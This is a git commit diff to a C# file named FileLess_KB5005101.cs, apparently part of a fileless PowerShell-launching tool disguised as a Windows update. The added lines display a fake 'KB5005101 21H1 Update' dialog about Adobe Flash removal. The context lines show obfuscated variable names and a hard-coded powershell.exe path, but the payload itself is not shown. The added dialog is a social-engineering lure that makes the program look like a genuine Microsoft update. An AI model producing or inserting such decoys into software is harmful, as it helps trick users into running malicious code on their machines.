71323256be281d55704f933f0aec6df1638996cd
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2022-01-27 03:40:32 +0000

    Update FileLess_KB5005101.cs

--- utils/FileLess_KB5005101.cs
+++ utils/FileLess_KB5005101.cs
@@ -1,3 +1,7 @@
+using Microsoft.Win32;
+using System;
+using System.Linq;
+using System.Windows.Forms;
 using System.Diagnostics;
 namespace Console
 {
@@ -9,6 +13,7 @@ namespace Console
            var uiou = @":8";
            var IndiaSailing = @"Colombo";
            var WarriorShepa = @"Viriato";
+           MessageBox.Show("IMPORTANT: This release includes the Flash Removal Package.\nTaking this update will remove Adobe Flash from the machine", "KB5005101 21H1 Update");            
            var TerminalPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            var FdxEstaMerda = @"HenrryTheNavigator";
 
